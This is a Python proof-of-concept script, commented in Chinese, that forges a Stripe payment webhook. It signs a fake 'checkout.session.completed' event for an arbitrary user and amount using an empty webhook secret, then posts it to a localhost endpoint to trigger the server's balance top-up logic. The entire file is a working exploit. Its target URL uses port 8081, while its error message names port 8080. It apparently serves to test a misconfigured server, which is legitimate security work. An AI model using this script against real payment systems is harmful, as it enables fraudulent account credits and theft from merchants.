import hmac
import hashlib
import time
import json
import requests

# 【第一阶段】：信息收集
WEBHOOK_URL = "http://localhost:8081/api/stripe/webhook"
SECRET = b""  # 确认服务端使用了空的 StripeWebhookSecret
CLIENT_REFERENCE_ID = "USR-9999-HACK-123456" # 目标用户/订单ID

def forge_signature(payload_str, secret, timestamp):
    """
    【第二阶段】：伪造签名
    Stripe 签名规则:
    signed_payload = "{timestamp}.{json_body}"
    v1 = HMAC-SHA256(webhook_secret, signed_payload)
    Header = "t={timestamp},v1={v1}"
    """
    signed_payload = f"{timestamp}.{payload_str}".encode('utf-8')
    v1 = hmac.new(secret, signed_payload, hashlib.sha256).hexdigest()
    return f"t={timestamp},v1={v1}"

def main():
    print("开始执行攻击测试...")
    
    # 【第三阶段】：构造恶意事件
    # 伪造一个 checkout.session.completed 事件
    payload_dict = {
        "id": "evt_test_forgery",
        "type": "checkout.session.completed",
        "data": {
            "object": {
                "id": "cs_test_hacked",
                "client_reference_id": CLIENT_REFERENCE_ID,
                "status": "complete",
                "payment_status": "paid",
                "amount_total": 999900  # 任意金额，这里是 9999.00
            }
        }
    }
    
    # 必须确保 json 序列化时没有多余的空格，以保证 payload 哈希与服务端接收一致
    json_body = json.dumps(payload_dict, separators=(',', ':'))
    timestamp = str(int(time.time()))
    
    # 生成伪造的 Stripe-Signature header
    signature_header = forge_signature(json_body, SECRET, timestamp)
    
    headers = {
        "Content-Type": "application/json",
        "Stripe-Signature": signature_header
    }
    
    print(f"\n[+] 构造的恶意 Payload:\n{json.dumps(payload_dict, indent=2)}")
    print(f"\n[+] 伪造的 Signature Header:\n{signature_header}")
    
    # 【第四阶段】：发送请求
    print(f"\n[+] 向 Webhook 端点发送带有伪造签名的 POST 请求: {WEBHOOK_URL}")
    try:
        response = requests.post(WEBHOOK_URL, data=json_body, headers=headers)
        print(f"\n[+] 服务端响应状态码: {response.status_code}")
        if response.status_code == 200:
            print("🎉 攻击成功！服务端已接受伪造的 Webhook 请求并执行了充值逻辑。")
        else:
            print(f"❌ 攻击失败，服务端返回: {response.text}")
    except requests.exceptions.ConnectionError:
        print("❌ 请求失败: 无法连接到服务端，请确认 server.go 已在 8080 端口启动。")
    except Exception as e:
        print(f"❌ 请求失败: {e}")

if __name__ == "__main__":
    main()
